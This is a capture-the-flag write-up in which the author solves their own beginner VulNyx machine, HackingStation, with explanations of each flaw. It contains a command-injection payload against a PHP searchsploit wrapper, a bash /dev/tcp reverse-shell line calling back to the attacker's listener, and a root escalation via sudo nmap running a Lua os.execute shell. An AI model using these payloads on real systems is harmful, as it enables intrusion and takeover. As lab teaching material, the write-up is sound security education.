---
layout: single
title: VulNyx&#58; HackingStation
excerpt: "Writeup of the machine HackingStation from VulNyx."
date: 2024-03-31
classes: wide
header:
  teaser: /assets/images/2024-03-31-vulnyx-hackingstation/box-info.png
  teaser_home_page: true
  icon:
categories:
  - ctf
tags:  
  - vulnyx
  - nmap
  - web
  - command injection
  - gtfobins
  - binary exploitation
---

## Summary 

- [1. Port and service scanning](#section-id-1)
- [2. Gaining access](#section-id-2)
  - [2.1. Detecting the command injection](#section-id-2-1)
  - [2.2. Getting a shell as hacker](#section-id-2-2)
  - [2.3. Why does this command injection exist?](#section-id-2-3)
- [3. Privilege escalation](#section-id-3)
  - [3.1. Detecting the nmap vulnerability](#section-id-3-1)
  - [3.2. Getting a shell as root](#section-id-3-2)
  - [3.3. Why does this privilege escalation via nmap exist?](#section-id-3-3)

<p style="text-align:center;"><img src="/assets/images/2024-03-31-vulnyx-hackingstation/box-info.png" style="width: 750px;"></p>

In this post we are going to see the writeup of the machine HackingStation from [VulNyx](https://vulnyx.com/). It's a low machine created by [HackCommander](https://hackcommander.github.io/) (yeah, it's me :blush:) especially designed for beginners. We are going to get access to the machine through a command injection in a web and then to escalate privileges through the nmap binary, which is allowed to run as superuser without password.

<div id='section-id-1'/>
## 1. Port and service scanning

After running a port scan

{% include codeHeader.html %}
```console
┌──(hackcommander㉿kali)-[~]
└─$ nmap -p- -Pn --min-rate 10000 10.0.2.17 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-30 21:39 CET
Nmap scan report for 10.0.2.17
Host is up (0.00010s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
```

we can see that the port 80 is open and therefore there is a web. Now running a service scan

{% include codeHeader.html %}
```console
┌──(hackcommander㉿kali)-[~]
└─$ nmap -p 80 -sCV 10.0.2.17     
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-30 21:39 CET
Nmap scan report for 10.0.2.17
Host is up (0.00029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: HackingStation

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.32 seconds
```

we can see that there is a webserver *Apache httpd 2.4.57* running on Debian, but before looking for CVEs it is better to take a look at the web.

<div id='section-id-2'/>
## 2. Gaining access

<div id='section-id-2-1'/>
## 2.1. Detecting the command injection

After accessing the web in *http://10.0.2.17/*, we can see that there is an exploit search functionality. 

![](/assets/images/2024-03-31-vulnyx-hackingstation/web-index.png)

For example, searching the term *Liferay*, yields the following result

![](/assets/images/2024-03-31-vulnyx-hackingstation/liferay-search.png)

The output is a list of exploits for the product *Liferay*, but it seems to be a functionality under development because the result is not well formatted. Also considering that the word *searchsploit* appears in the output, it seems quite likely that the site is running the searchsploit console tool in the backend.

If this is happening and the backend doesn't sanitize the input data, there could be a [command injection](https://portswigger.net/web-security/os-command-injection). During command injection exploitation it is very common to attempt to concatenate commands with the character ;. In this case, the following input

{% include codeHeader.html %}
```html
Liferay;whoami
```

yields the following result

![](/assets/images/2024-03-31-vulnyx-hackingstation/whoami-search.png)

The result contains at the end the word *hacker*, which must be the user with which is running the application, so it is confirmed that **the web is vulnerable to command injection**.

<div id='section-id-2-2'/>
## 2.2. Getting a shell as hacker

Now is the time to get a shell. First we set up a listener on the attacking machine on port 8000 using the command

{% include codeHeader.html %}
```console
nc -nlvp 8000
```

and then send the following payload

{% include codeHeader.html %}
```html
Liferay;bash -c 'bash -i >& /dev/tcp/10.0.2.15/8000 0>&1'
```

After this, we get a shell with the *hacker* user and that the user flag is in */home/hacker/user.txt*.

{% include codeHeader.html %}
```console
┌──(hackcommander㉿kali)-[~]
└─$ nc -nlvp 8000
listening on [any] 8000 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.17] 56646
bash: cannot set terminal process group (508): Inappropriate ioctl for device
bash: no job control in this shell
hacker@HackingStation:/var/www/html$ whoami
whoami
hacker
hacker@HackingStation:/var/www/html$ cd /home/hacker
cd /home/hacker
hacker@HackingStation:/home/hacker$ ls
ls
snap
user.txt
```

<div id='section-id-2-3'/>
## 2.3. Why does this command injection exist?

As we saw in the captures above, the vulnerability is in the script *exploitQuery.php*. If we check the content of the script

{% include codeHeader.html %}
```console
hacker@HackingStation:/home/hacker$ cd /var/www/html
cd /var/www/html
hacker@HackingStation:/var/www/html$ ls
ls
exploitQuery.php
hacker.jpg
index.html
hacker@HackingStation:/var/www/html$ cat exploitQuery.php
cat exploitQuery.php
<?php
   exec('searchsploit -wj ' . $_GET['product'], $results);
   $json_string = json_encode($results, JSON_PRETTY_PRINT);
   echo '<pre>' . $json_string . '</pre>'; 
?>
```

we can see that **the product parameter is passed without sanitization to an [exec](https://www.php.net/manual/en/function.exec.php) PHP function**, so there is a command injection. For example, when we send the payload

{% include codeHeader.html %}
```html
Liferay
```

the backend executes the following command

{% include codeHeader.html %}
```console
searchsploit -wj Liferay
```

However, when we send the following payload

{% include codeHeader.html %}
```html
Liferay;whoami
```

the backend executes the following commands

{% include codeHeader.html %}
```console
searchsploit -wj Liferay;whoami
```

In this way, first is executed the command *searchsploit -wj Liferay* and then the command *whoami*.

It is not recommended to use functions to execute system commands, and if there is no other option, it is mandatory to validate or sanitize the input before passing it to the function.

<div id='section-id-3'/>
## 3. Privilege escalation

<div id='section-id-3-1'/>
## 3.1. Detecting the nmap vulnerability

After examining the home directory of the *hacker* user, there is nothing unusual or suspicious. Returning to the web index we can see that it says the following message

```html
Coming soon to HackingStation... NMAP!!!!!
```

Nmap requires superuser permissions for certain use cases so it wouldn't be strange that, if they are working on developing some web functionality with nmap, they left some misconfigurations about the nmap binary.

The following command

{% include codeHeader.html %}
```console
sudo -l
```

checks the */etc/sudoers* file (or any other file specified by the sudoers configuration) to determine what commands and actions are allowed to be executed with elevated privileges via *sudo*. The result of this command is

{% include codeHeader.html %}
```console
hacker@HackingStation:/home/hacker$ sudo -l
sudo -l
Matching Defaults entries for hacker on HackingStation:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User hacker may run the following commands on HackingStation:
    (root) NOPASSWD: /usr/bin/nmap
```

so we can execute nmap as root with sudo without password. This doesn't sound very safe.

<div id='section-id-3-2'/>
## 3.2. Getting a shell as root

Searching in [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#sudo) we get the following result

![](/assets/images/2024-03-31-vulnyx-hackingstation/gtfobins.png)

Checking the version of nmap

{% include codeHeader.html %}
```console
hacker@HackingStation:/home/hacker$ nmap -V
nmap -V
Nmap version 7.93 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.6 openssl-3.0.11 libssh2-1.10.0 libz-1.2.13 libpcre-8.39 libpcap-1.10.3 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select
```

we can see that the installed nmap is in version 7.93, so interactive mode is not available. This means that the second method is not applicable in this case. 

On the other hand, the first method is based on nmap functionality to execute scripts written in Lua. So executing that commands we get the following result

{% include codeHeader.html %}
```console
hacker@HackingStation:/home/hacker$ TF=$(mktemp)
TF=$(mktemp)                                                                                                                                                                                                                                
hacker@HackingStation:/home/hacker$ echo 'os.execute("/bin/sh")' > $TF                                                                                                                                                                      
echo 'os.execute("/bin/sh")' > $TF                                                                                                                                                                                                          
hacker@HackingStation:/home/hacker$ sudo nmap --script=$TF                                                                                                                                                                                  
sudo nmap --script=$TF                                                                                                                                                                                                                      
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-31 01:54 CET                                                                                                                                                                             
NSE: Warning: Loading '/tmp/tmp.YUNY6mz4mx' -- the recommended file extension is '.nse'.                                                                                                                                                    
whoami
root
cd /root
ls
root.txt
snap
```

We can see that we got a shell with the *root* user and that the root flag is in */root/root.txt*.

<div id='section-id-3-3'/>
## 3.3. Why does this privilege escalation via nmap exist?

The function *os.execute* in Lua allows the execution of operating system commands, so the following Lua code

{% include codeHeader.html %}
```lua
os.execute("/bin/sh")
```

is essentially a shell. **When this Lua code is executed through nmap, a shell will be invoked with the same user that executed nmap**. In this case, if nmap is executed without sudo, we get a shell with the *hacker* user, but if we execute nmap with sudo, we get a shell with the *root* user.

We can see this in the following root processes with PIDs from 1137 to 1140

![](/assets/images/2024-03-31-vulnyx-hackingstation/root-pids.png)

where 1140 is the PID of the current root shell.
